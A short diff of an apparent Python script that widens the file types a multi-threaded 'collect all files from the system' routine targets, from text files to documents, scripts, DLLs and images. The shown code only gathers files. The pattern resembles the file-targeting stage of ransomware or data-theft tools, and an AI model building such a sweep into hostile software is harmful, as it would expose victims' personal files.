@@ -90,7 +90,7 @@ def main():
     # collect all files from the system into a list
     NUM_THREADS = 100 
     threads = []
-    extensions = (".txt") #".py", ".pdf", ".odt", ".doc", ".docx", ".dll", ".sh", ".png", ".jpg")
+    extensions = (".txt", ".py", ".pdf", ".odt", ".doc", ".docx", ".dll", ".sh", ".png", ".jpg")
     """
     for i in range(NUM_THREADS):
         t = threading.Thread(target=collect, args=extensions)
